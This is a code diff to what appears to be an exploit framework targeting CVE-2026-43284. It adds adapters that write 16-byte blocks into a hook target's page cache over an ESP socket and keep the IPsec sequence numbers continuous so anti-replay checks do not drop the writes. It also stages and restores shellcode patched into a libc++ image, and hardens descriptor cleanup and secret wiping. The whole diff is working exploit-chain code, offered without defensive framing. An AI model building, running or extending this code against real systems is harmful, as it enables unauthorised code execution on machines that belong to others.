@@ -108,6 +108,31 @@ namespace ghostlock::backend::cve_2026_43284 {
                     ctx->bridge.ctx, ctx->target_path, offset, pipe_write_fd);
         }
 
+        /* B5-9h-4 hook write face: frame one 16-byte block over the hook
+         * target's page cache exactly like the carrier. write16 returns the
+         * pagecache::WriteResult as int32 (0 == Ok) for HookPatchIo; read16
+         * maps it back to a 16-byte read or -EIO. */
+        std::int32_t real_hook_write16_adapter(void *raw, std::uint64_t offset,
+                                               const void *bytes16) noexcept {
+            if (raw == nullptr || bytes16 == nullptr) {
+                return static_cast<std::int32_t>(WriteResult::InvalidArgument);
+            }
+            auto &page = *static_cast<PageCacheWriteContext *>(raw);
+            return static_cast<std::int32_t>(
+                    write16(page, offset, static_cast<const std::uint8_t *>(bytes16)));
+        }
+
+        long real_hook_read16_adapter(void *raw, std::uint64_t offset,
+                                      std::uint8_t out[16]) noexcept {
+            if (raw == nullptr || out == nullptr) {
+                return -EINVAL;
+            }
+            auto &page = *static_cast<PageCacheWriteContext *>(raw);
+            const WriteResult result = read_block(page, offset, out);
+            return result == WriteResult::Ok ? static_cast<long>(kBlockBytes)
+                                             : -EIO;
+        }
+
         [[nodiscard]] bool probe_exists(const platform::DeviceProbeOps &device,
                                         const char *path) noexcept {
             if (device.file_fact == nullptr || path == nullptr) {
@@ -138,6 +163,46 @@ namespace ghostlock::backend::cve_2026_43284 {
         ops.write.ctx = &ctx;
         ops.read_block = real_read_block;
         return ops;
+    }
+
+    steps::HookPatchIo make_real_hook_io(PageCacheWriteContext &hook_page) noexcept {
+        steps::HookPatchIo io{};
+        /* Derive availability from the same page-cache readiness predicate the
+         * carrier write uses: write surface + ESP socket + ICV + a ciphertext
+         * page source. An unopenable hook file stays usable only through the
+         * helper write source. */
+        if (make_file_cache_write_ops(hook_page).write16 == nullptr) {
+            return io;
+        }
+        io.ctx = &hook_page;
+        io.write16 = &real_hook_write16_adapter;
+        io.read16 = &real_hook_read16_adapter;
+        return io;
+    }
+
+    long real_chain_hook_old_page_read16(void *raw, std::uint64_t offset,
+                                         std::uint8_t out[16]) noexcept {
+        if (raw == nullptr || out == nullptr) {
+            return -EINVAL;
+        }
+        auto *ctx = context_from_page(raw);
+        if (ctx->hook_path == nullptr || !ctx->bridge.available()) {
+            return -ENOSYS;
+        }
+        return ctx->bridge.read16(ctx->bridge.ctx, ctx->hook_path, offset, out);
+    }
+
+    long real_chain_hook_helper_splice16(void *raw, int pipe_write_fd,
+                                         std::uint64_t offset) noexcept {
+        if (raw == nullptr) {
+            return -EINVAL;
+        }
+        auto *ctx = context_from_page(raw);
+        if (ctx->hook_path == nullptr || !ctx->bridge.available()) {
+            return -ENOSYS;
+        }
+        return ctx->bridge.splice16_into_pipe(ctx->bridge.ctx, ctx->hook_path,
+                                              offset, pipe_write_fd);
     }
 
     long real_chain_read_block(void *raw, std::uint64_t offset,
@@ -235,6 +300,12 @@ namespace ghostlock::backend::cve_2026_43284 {
             displaced_slot = steps::kLibcxxSlotDisplaced;
         }
 
+        /* The hook target shares the carrier's ESP SA/socket, so its block
+         * writes must continue the carrier's sequence numbers (a reset would
+         * be dropped by anti-replay). Copy the counter in before the reads, and
+         * hand the advanced counter back after the writes. */
+        ctx->hook_page.next_seq = ctx->page.next_seq;
+
         steps::HookPatchError error = steps::HookPatchError::None;
         if (!steps::plan_hook_patch(ctx->libcxx_image, ctx->libcxx_image_size,
                                     symbol, ctx->hook_guard, *tmpl, hook_bindings,
@@ -248,23 +319,28 @@ namespace ghostlock::backend::cve_2026_43284 {
          * first write so a partial apply is still rolled back at the terminus.
          * Restoring a not-yet-written region rewrites identical bytes. */
         ctx->hook_applied = true;
-        if (!steps::apply_hook_patch(ctx->hook_plan, ctx->hook_io, error)) {
-            return steps::ChainError::HookFailed;
-        }
-        return steps::ChainError::None;
+        const bool applied =
+                steps::apply_hook_patch(ctx->hook_plan, ctx->hook_io, error);
+        ctx->page.next_seq = ctx->hook_page.next_seq;
+        return applied ? steps::ChainError::None : steps::ChainError::HookFailed;
     }
 
-    void real_chain_restore_hook(void *raw) noexcept {
+    bool real_chain_restore_hook(void *raw) noexcept {
         if (raw == nullptr) {
-            return;
+            return false;
         }
         RealChainContext *ctx = context_from_page(raw);
         if (!ctx->hook_applied) {
-            return;
+            return false;
         }
+        /* The restore writes through the same ESP SA/socket; keep the sequence
+         * counter continuous with the carrier and the apply. */
+        ctx->hook_page.next_seq = ctx->page.next_seq;
         steps::HookPatchError error = steps::HookPatchError::None;
         (void)steps::restore_hook_patch(ctx->hook_plan, ctx->hook_io, error);
+        ctx->page.next_seq = ctx->hook_page.next_seq;
         ctx->hook_applied = false;
+        return true;
     }
 
     int real_chain_trigger(void *raw) noexcept {
@@ -360,37 +436,54 @@ namespace ghostlock::backend::cve_2026_43284 {
             return;
         }
         RealChainContext *ctx = context_from_page(raw);
+        /* Exactly-once terminus: the chain's finish() calls the bound release
+         * callback once, and the staged/production callers may also call this
+         * directly on a pre-chain rejection. The guard makes the second call a
+         * no-op instead of re-closing fds that may already be reused. */
+        if (ctx->released) {
+            return;
+        }
         const int file_fd = ctx->page.file_fd;
         const int socket_fd = ctx->page.socket_fd;
         const int crash_dump_fd = ctx->crash_dump_fd;
+        /* The hook target has its own fd; its socket aliases page.socket_fd, so
+         * only the distinct hook fd is closed here. */
+        const int hook_fd = ctx->hook_page.file_fd;
         ctx->page.file_fd = -1;
         ctx->page.socket_fd = -1;
         ctx->crash_dump_fd = -1;
-        if (ctx->page.io.close_fd != nullptr) {
-            if (file_fd >= 0) {
-                (void)ctx->page.io.close_fd(file_fd);
+        ctx->hook_page.file_fd = -1;
+        ctx->hook_page.socket_fd = -1;
+        const auto close_distinct = [&](int fd) noexcept {
+            if (fd < 0 || fd == file_fd || fd == socket_fd ||
+                fd == crash_dump_fd) {
+                return;
             }
-            if (socket_fd >= 0 && socket_fd != file_fd) {
-                (void)ctx->page.io.close_fd(socket_fd);
+            if (ctx->page.io.close_fd != nullptr) {
+                (void)ctx->page.io.close_fd(fd);
+            } else {
+                (void)::close(fd);
             }
-            if (crash_dump_fd >= 0 && crash_dump_fd != file_fd &&
-                crash_dump_fd != socket_fd) {
-                (void)ctx->page.io.close_fd(crash_dump_fd);
+        };
+        const auto close_one = [&](int fd) noexcept {
+            if (fd < 0) {
+                return;
             }
-        } else {
-            if (file_fd >= 0) {
-                (void)::close(file_fd);
+            if (ctx->page.io.close_fd != nullptr) {
+                (void)ctx->page.io.close_fd(fd);
+            } else {
+                (void)::close(fd);
             }
-            if (socket_fd >= 0 && socket_fd != file_fd) {
-                (void)::close(socket_fd);
-            }
-            if (crash_dump_fd >= 0 && crash_dump_fd != file_fd &&
-                crash_dump_fd != socket_fd) {
-                (void)::close(crash_dump_fd);
-            }
+        };
+        close_one(file_fd);
+        if (socket_fd != file_fd) {
+            close_one(socket_fd);
         }
+        close_distinct(crash_dump_fd);
+        close_distinct(hook_fd);
         /* Wipe the session secrets through the non-elidable vol-store path. */
         zeroize(ctx->page);
+        zeroize(ctx->hook_page);
         ctx->released = true;
     }
 
@@ -416,12 +509,19 @@ namespace ghostlock::backend::cve_2026_43284 {
                 ctx.page.helper_write.splice16 = &real_chain_helper_splice16;
             }
         }
+        /* B5-9h-4: bind the hook stage only when the caller armed every asset
+         * (image + both shellcode buffers + a usable page-cache write face).
+         * An unarmed context leaves apply_hook/restore_hook null so the chain
+         * reports hook=0 instead of failing closed late. */
+        const bool hook_armed =
+                ctx.libcxx_image != nullptr && ctx.hook_shellcode != nullptr &&
+                ctx.hook_shellcode_orig != nullptr && ctx.hook_io.available();
         steps::ChainOps ops{};
         ops.write = make_file_cache_write_ops(ctx.page);
         ops.patch_crash_dump = real_chain_patch_crash_dump;
         ops.read_block = real_chain_read_block;
-        ops.apply_hook = real_chain_apply_hook;
-        ops.restore_hook = real_chain_restore_hook;
+        ops.apply_hook = hook_armed ? real_chain_apply_hook : nullptr;
+        ops.restore_hook = hook_armed ? real_chain_restore_hook : nullptr;
         ops.trigger = real_chain_trigger;
         ops.wait_result = real_chain_wait_result;
         ops.release = real_chain_release;
